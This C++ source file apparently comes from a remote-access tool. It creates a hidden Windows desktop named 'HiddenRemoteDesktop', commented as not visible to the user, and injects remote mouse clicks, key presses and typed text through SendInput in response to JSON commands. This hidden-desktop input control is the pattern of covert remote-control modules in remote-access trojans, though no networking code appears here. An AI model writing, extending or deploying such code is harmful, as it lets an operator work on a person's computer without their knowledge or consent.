#include "RemoteControl.h"

RemoteDesktop* g_RemoteDesktop = nullptr;

RemoteDesktop::RemoteDesktop() 
    : m_hOriginalDesktop(nullptr)
    , m_hHiddenDesktop(nullptr)
    , m_isUsingHiddenDesktop(false) {
    m_hOriginalDesktop = GetThreadDesktop(GetCurrentThreadId());
}

RemoteDesktop::~RemoteDesktop() {
    Cleanup();
}

bool RemoteDesktop::CreateHiddenDesktop() {
    if (m_hHiddenDesktop) {
        return true;
    }
    
    // Create a new desktop (not visible to the user)
    m_hHiddenDesktop = CreateDesktopA(
        "HiddenRemoteDesktop",
        NULL,
        NULL,
        0,
        DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU | DESKTOP_HOOKCONTROL |
        DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK | DESKTOP_READOBJECTS |
        DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP,
        NULL
    );
    
    if (!m_hHiddenDesktop) {
        return false;
    }
    return true;
}

bool RemoteDesktop::SwitchToHiddenDesktop() {
    if (!m_hHiddenDesktop) {
        if (!CreateHiddenDesktop()) {
            return false;
        }
    }
    
    if (!SetThreadDesktop(m_hHiddenDesktop)) {
        return false;
    }
    
    if (!SwitchDesktop(m_hHiddenDesktop)) {
    }
    
    m_isUsingHiddenDesktop = true;
    return true;
}

bool RemoteDesktop::SwitchToOriginalDesktop() {
    if (!m_hOriginalDesktop) {
        return false;
    }
    
    if (!SetThreadDesktop(m_hOriginalDesktop)) {
        return false;
    }
    
    if (!SwitchDesktop(m_hOriginalDesktop)) {
    }
    
    m_isUsingHiddenDesktop = false;
    return true;
}

void RemoteDesktop::Cleanup() {
    if (m_isUsingHiddenDesktop) {
        SwitchToOriginalDesktop();
    }
    
    if (m_hHiddenDesktop) {
        CloseDesktop(m_hHiddenDesktop);
        m_hHiddenDesktop = nullptr;
    }
}

// Handle mouse events
void HandleMouseEvent(const json& data) {
    try {
        std::string action = data["action"];
        
        if (action == "move") {
            int x = data["x"];
            int y = data["y"];
            int screenWidth = data["screenWidth"];
            int screenHeight = data["screenHeight"];
            
            // Get monitor bounds if streaming specific monitor
            int monitorOffsetX = 0;
            int monitorOffsetY = 0;
            int monitorWidth = screenWidth;
            int monitorHeight = screenHeight;
            
            if (data.contains("monitorIndex")) {
                int monitorIndex = data["monitorIndex"];
                
                if (monitorIndex == -1) {
                    // All monitors (Virtual Screen)
                    monitorOffsetX = GetSystemMetrics(SM_XVIRTUALSCREEN);
                    monitorOffsetY = GetSystemMetrics(SM_YVIRTUALSCREEN);
                    monitorWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
                    monitorHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
                } else {
                    // Specific monitor
                    DISPLAY_DEVICE dd;
                    dd.cb = sizeof(DISPLAY_DEVICE);
                    
                    int currentMonitor = 0;
                    for (int i = 0; EnumDisplayDevices(NULL, i, &dd, 0); i++) {
                        if (!(dd.StateFlags & DISPLAY_DEVICE_ACTIVE)) continue;
                        
                        if (currentMonitor == monitorIndex) {
                            DEVMODE dm;
                            dm.dmSize = sizeof(DEVMODE);
                            if (EnumDisplaySettings(dd.DeviceName, ENUM_CURRENT_SETTINGS, &dm)) {
                                monitorOffsetX = dm.dmPosition.x;
                                monitorOffsetY = dm.dmPosition.y;
                                monitorWidth = dm.dmPelsWidth;
                                monitorHeight = dm.dmPelsHeight;
                                break;
                            }
                        }
                        currentMonitor++;
                    }
                }
            } else {
                // Fallback to primary monitor
                monitorOffsetX = 0;
                monitorOffsetY = 0;
                monitorWidth = GetSystemMetrics(SM_CXSCREEN);
                monitorHeight = GetSystemMetrics(SM_CYSCREEN);
            }
            
            // Convert canvas coordinates to actual monitor coordinates
            int actualX = monitorOffsetX + (x * monitorWidth) / screenWidth;
            int actualY = monitorOffsetY + (y * monitorHeight) / screenHeight;
            
            // Get virtual screen dimensions for absolute mapping
            int virtualX = GetSystemMetrics(SM_XVIRTUALSCREEN);
            int virtualY = GetSystemMetrics(SM_YVIRTUALSCREEN);
            int virtualWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
            int virtualHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
            
            // Map to absolute coordinates (0-65535) relative to virtual screen
            int absX = ((actualX - virtualX) * 65535) / virtualWidth;
            int absY = ((actualY - virtualY) * 65535) / virtualHeight;
            
            INPUT input = {0};
            input.type = INPUT_MOUSE;
            input.mi.dx = absX;
            input.mi.dy = absY;
            input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | MOUSEEVENTF_VIRTUALDESK;
            
            SendInput(1, &input, sizeof(INPUT));
        }
        else if (action == "click") {
            std::string button = data["button"];
            INPUT inputs[2] = {0};
            
            if (button == "left") {
                inputs[0].type = INPUT_MOUSE;
                inputs[0].mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
                inputs[1].type = INPUT_MOUSE;
                inputs[1].mi.dwFlags = MOUSEEVENTF_LEFTUP;
            }
            else if (button == "right") {
                inputs[0].type = INPUT_MOUSE;
                inputs[0].mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
                inputs[1].type = INPUT_MOUSE;
                inputs[1].mi.dwFlags = MOUSEEVENTF_RIGHTUP;
            }
            else if (button == "middle") {
                inputs[0].type = INPUT_MOUSE;
                inputs[0].mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN;
                inputs[1].type = INPUT_MOUSE;
                inputs[1].mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
            }
            
            SendInput(2, inputs, sizeof(INPUT));
        }
        else if (action == "dblclick") {
            INPUT inputs[4] = {0};
            inputs[0].type = INPUT_MOUSE;
            inputs[0].mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
            inputs[1].type = INPUT_MOUSE;
            inputs[1].mi.dwFlags = MOUSEEVENTF_LEFTUP;
            inputs[2].type = INPUT_MOUSE;
            inputs[2].mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
            inputs[3].type = INPUT_MOUSE;
            inputs[3].mi.dwFlags = MOUSEEVENTF_LEFTUP;
            
            SendInput(4, inputs, sizeof(INPUT));
        }
        else if (action == "wheel") {
            int delta = data["delta"];
            INPUT input = {0};
            input.type = INPUT_MOUSE;
            input.mi.dwFlags = MOUSEEVENTF_WHEEL;
            input.mi.mouseData = delta;
            
            SendInput(1, &input, sizeof(INPUT));
        }
    }
    catch (...) {
    }
}

// Handle keyboard events
void HandleKeyboardEvent(const json& data) {
    try {
        std::string action = data["action"];
        
        if (action == "keydown" || action == "keyup") {
            int keyCode = data["keyCode"];
            bool isKeyUp = (action == "keyup");
            
            INPUT input = {0};
            input.type = INPUT_KEYBOARD;
            input.ki.wVk = keyCode;
            input.ki.dwFlags = isKeyUp ? KEYEVENTF_KEYUP : 0;
            
            SendInput(1, &input, sizeof(INPUT));
        }
        else if (action == "type") {
            std::string text = data["text"];
            
            for (char c : text) {
                INPUT inputs[2] = {0};
                SHORT vk = VkKeyScanA(c);
                BYTE keyCode = LOBYTE(vk);
                BYTE shiftState = HIBYTE(vk);
                
                int inputCount = 0;
                
                // Press Shift if needed
                if (shiftState & 1) {
                    inputs[inputCount].type = INPUT_KEYBOARD;
                    inputs[inputCount].ki.wVk = VK_SHIFT;
                    inputCount++;
                }
                
                // Press key
                inputs[inputCount].type = INPUT_KEYBOARD;
                inputs[inputCount].ki.wVk = keyCode;
                inputCount++;
                
                SendInput(inputCount, inputs, sizeof(INPUT));
                
                // Release key
                inputCount = 0;
                inputs[inputCount].type = INPUT_KEYBOARD;
                inputs[inputCount].ki.wVk = keyCode;
                inputs[inputCount].ki.dwFlags = KEYEVENTF_KEYUP;
                inputCount++;
                
                // Release Shift if needed
                if (shiftState & 1) {
                    inputs[inputCount].type = INPUT_KEYBOARD;
                    inputs[inputCount].ki.wVk = VK_SHIFT;
                    inputs[inputCount].ki.dwFlags = KEYEVENTF_KEYUP;
                    inputCount++;
                }
                
                SendInput(inputCount, inputs, sizeof(INPUT));
                
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
            }
        }
    }
    catch (...) {
    }
}

// Main remote control handler
void HandleRemoteControl(const std::string& action, const json& data) {
    if (action == "ENABLE_HIDDEN_DESKTOP") {
        if (!g_RemoteDesktop) {
            g_RemoteDesktop = new RemoteDesktop();
        }
        
        if (g_RemoteDesktop->SwitchToHiddenDesktop()) {
        }
    }
    else if (action == "DISABLE_HIDDEN_DESKTOP") {
        if (g_RemoteDesktop) {
            g_RemoteDesktop->SwitchToOriginalDesktop();
        }
    }
    else if (action == "MOUSE_EVENT") {
        HandleMouseEvent(data);
    }
    else if (action == "KEYBOARD_EVENT") {
        HandleKeyboardEvent(data);
    }
}
